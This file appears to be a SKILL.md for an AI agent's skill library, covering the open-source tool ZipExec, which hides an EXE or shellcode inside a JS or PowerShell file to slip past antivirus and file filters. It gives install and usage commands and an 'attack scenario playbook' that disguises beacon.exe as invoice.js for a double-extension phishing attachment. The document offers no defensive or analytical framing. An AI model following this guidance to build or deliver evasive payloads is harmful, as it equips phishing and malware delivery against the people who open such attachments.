---
name: zipexec-macros
description: "ZipExec: AV-evasion payload delivery. Signals: payload development, weaponization, EXE hides JS, additional options."
zh-signals: "ZipExec: 载荷免杀投递。信号:载荷开发,武器化,EXE 藏 JS,附加选项。"
when-to-use: >-
  Use when developing AV-evasion payload delivery and you need to wrap an EXE or
  shellcode into a JS/PS double-extension file to bypass file filtering.
---

# ZipExec

- Attack Category: C07 Payload Development and Weaponization
- Upstream Repository: https://github.com/Tylous/ZipExec
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Tylous/ZipExec && cd ZipExec && go build
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./ZipExec -I payload.exe -O out.js` | Hide an EXE inside JS |
| `-I shellcode.bin -O out.ps1` | Convert shellcode to PS |
| `-a` | Additional options |

## Attack Scenario Playbook

### AV-Evasive Payload Delivery

```bash
./ZipExec -I beacon.exe -O invoice.js
# Double-extension phishing attachment
```

## Notes

By Tylous, converts an EXE into a JS/PS payload to bypass file filtering.
